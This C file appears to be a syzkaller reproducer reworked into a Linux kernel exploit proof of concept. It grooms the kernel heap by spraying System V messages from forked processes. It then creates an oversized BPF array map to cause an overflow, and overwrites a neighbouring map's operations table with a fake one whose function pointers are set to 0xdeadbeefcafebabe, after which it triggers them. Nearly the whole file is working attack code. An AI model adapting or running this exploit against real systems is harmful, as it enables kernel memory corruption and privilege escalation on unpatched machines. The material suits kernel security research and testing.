// autogenerated by syzkaller (http://github.com/google/syzkaller)

#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/capability.h>
#include <linux/bpf.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/msg.h>

__attribute__((noreturn)) static void doexit(int status)
{
  volatile unsigned i;
  syscall(__NR_exit_group, status);
  for (i = 0;; i++) {
  }
}
#include <errno.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define BUFF_SIZE  192
#define STRUCT_LEN_KEY (BUFF_SIZE - 0x30)
#define BASE_MSGTYPE 0x4141414141414141
#define BPF_OBJ_NAME_LEN 16U
#define NUM_MSG 9
struct bpf_attr_0 { /* anonymous struct used by BPF_MAP_CREATE command */
		__u32	map_type;	/* one of enum bpf_map_type */
		__u32	key_size;	/* size of key in bytes */
		__u32	value_size;	/* size of value in bytes */
		__u32	max_entries;	/* max number of entries in a map */
		__u32	map_flags;	/* BPF_MAP_CREATE related
					 * flags defined above.
					 */
		__u32	inner_map_fd;	/* fd pointing to the inner map */
		__u32	numa_node;	/* numa node (effective only if
					 * BPF_F_NUMA_NODE is set).
					 */
		char	map_name[BPF_OBJ_NAME_LEN];
};

struct msgbuf_key { 
	long mtype;
	char mtext[STRUCT_LEN_KEY];
};

struct bpf_map_ops {
	/* funcs callable from userspace (via syscall) */
	struct bpf_map *(*map_alloc)(union bpf_attr *attr);
	void (*map_release)(struct bpf_map *map, struct file *map_file);
	void (*map_free)(struct bpf_map *map);
	int (*map_get_next_key)(struct bpf_map *map, void *key, void *next_key);

	/* funcs callable from userspace and from eBPF programs */
	void *(*map_lookup_elem)(struct bpf_map *map, void *key);
	int (*map_update_elem)(struct bpf_map *map, void *key, void *value, unsigned long flags);
	int (*map_delete_elem)(struct bpf_map *map, void *key);
};

struct msgbuf_key msg_key = {BASE_MSGTYPE, {0}};
int msqid;

const unsigned long evil_pointer = 0xdeadbeefcafebabe;
struct bpf_map_ops fake_queue_map_ops = {
  .map_alloc = 0xdeadbeefcafebabe,
  .map_release = 0xdeadbeefcafebabe,
	.map_free = 0xdeadbeefcafebabe,
  .map_get_next_key = 0xdeadbeefcafebabe,
  .map_lookup_elem = 0xdeadbeefcafebabe,
  .map_update_elem = 0xdeadbeefcafebabe,
  .map_delete_elem = 0xdeadbeefcafebabe,
};

static void loop();

void sendmymsg(int start, int num) {
	int i;
	size_t size;
	void *x;
    for (i = start; i < start+num; i++) {
    	msg_key.mtype = BASE_MSGTYPE + i;
		
    	if (i >= 64) {
    		perror("too much");
    		exit(1);
    	}

        if (msgsnd(msqid, &msg_key, sizeof(msg_key.mtext), 0) == -1) {
            perror("msgsnd");
            exit(1);
        }
    }
}

void recvmymsg(int index) {
	struct msgbuf_key msg_rcv;
	if (msgrcv(msqid, (void *) &msg_rcv, sizeof(msg_rcv.mtext), BASE_MSGTYPE+index,
				MSG_NOERROR | IPC_NOWAIT) == -1) {
		if(errno != ENOMSG) {
			perror("msgrcv");
			exit(1);
		}
	}
	else {
		//printf("message received: %s\n", msg.mtext);
	}
	return;
}

void fork_and_spray(int num) {
	int i;
	pid_t pid = -1;
	for (i = 0; i < num; i++) {
		pid = fork();
		if (pid == -1) {
			perror("fork");
			exit(0);
		}
		if (pid == 0) {
			if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		        perror("msgget");
		        exit(1);
		    }

			sendmymsg(0, 64);
			pause();
		}
	}
}

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

long r_bfp1[1], r_bfp2[1];
void loop()
{
  memset(r_bfp1, -1, sizeof(r_bfp1));
  memset(r_bfp2, -1, sizeof(r_bfp2));
  syscall(__NR_mmap, 0x20000000, 0xfff000, 3, 0x32, -1, 0);
  printf("[+] mmap\n");

  struct bpf_attr_0 *b = (struct bpf_attr_0 *)0x20004fec;
  b->map_type = 2;
  b->key_size = 4;
  b->value_size = 8;
  b->max_entries = 0xfffffffe;
  b->map_flags = 0;
  b->inner_map_fd = 0;
  b->numa_node = 0;
  memset(b->map_name, 0, BPF_OBJ_NAME_LEN);
  recvmymsg(NUM_MSG - 2);
  r_bfp1[0] = syscall(__NR_bpf, BPF_MAP_CREATE, 0x20004fec, 0x2c);
  printf("[+] bpf one allocated\n");

  recvmymsg(NUM_MSG - 1);
  r_bfp2[0] = syscall(__NR_bpf, BPF_MAP_CREATE, 0x20004fec, 0x2c);
  printf("[+] bpf two allocated\n");

  *(uint32_t*)0x20eaf000 = r_bfp1[0];
  *(uint64_t*)0x20eaf008 = 0x20e7f000;
  *(uint64_t*)0x20eaf010 = 0x20eb0f77;
  *(uint64_t*)0x20eaf018 = 0;
  memcpy((void*)0x20e7f000, "\x06", 1);
  *(uint64_t*)0x20eb0f77 = &fake_queue_map_ops;
  //memcpy((void*)0x20eb0f77, "AAAAAAAABBBBBBBB", 16);
  syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, 0x20eaf000, 0x20);
  printf("[+] bpf updated\n");

  *(uint32_t*)0x20700000 = r_bfp2[0];
  *(uint64_t*)0x20700008 = 0x20e7f000;
  syscall(__NR_bpf, BPF_MAP_DELETE_ELEM, 0x20700000, 0x10);
  printf("[+] bpf freed\n");
}

int main()
{

  fork_and_spray(5);
  sleep(5);

  if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
  sendmymsg(0, NUM_MSG);
  loop();
  return 0;
}